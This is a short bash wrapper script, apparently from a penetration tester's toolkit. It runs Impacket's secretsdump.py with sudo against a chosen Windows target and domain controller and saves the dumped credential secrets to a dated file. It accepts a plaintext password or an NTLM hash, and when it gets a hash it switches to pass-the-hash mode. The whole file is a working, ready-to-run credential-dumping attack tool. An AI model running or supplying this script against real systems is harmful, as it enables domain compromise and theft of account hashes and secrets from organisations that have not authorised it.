#!/bin/bash
# ARGS
# DC_IP "Domain Controller IP Address"
# Target "Target to dump"
# Domain "FQDN of domain: prod.example.local"
# Username "Valid User on domain"
# Password "Password or hash (LM:NT)"
# ENDARGS
# AUTHOR: Mitchell Kerns

dc_ip="$1"
target="$2"
domain="$3"
user="$4"
pass_or_hash="$5"

# Construct the command using an array
pwd_cmd=("sudo" "python3" "/usr/share/doc/python3-impacket/examples/secretsdump.py" "-dc-ip" "$dc_ip" "-target-ip" "$target" "$domain/$user:$pass_or_hash" "-outputfile" "secrets_$(date +%F).txt")
hash_cmd=("sudo" "python3" "/usr/share/doc/python3-impacket/examples/secretsdump.py" "-dc-ip" "$dc_ip" "-target-ip" "$target" "$domain/$user" "-hashes" "$pass_or_hash" "-outputfile" "secrets_$(date +%F).txt")

if [ "${#pass_or_hash}" -ge 32 ]; then
    # Length is 32 or more, assume it's a hash
    echo "Input is considered a hash. Executing secretsdump..."
    echo "${hash_cmd[@]}"
    "${hash_cmd[@]}"
else
    # Length is less than 32, assume it's a password
    echo "Input is considered a password. Executing secretsdump..."
    echo "${pwd_cmd[@]}"
    "${pwd_cmd[@]}"
fi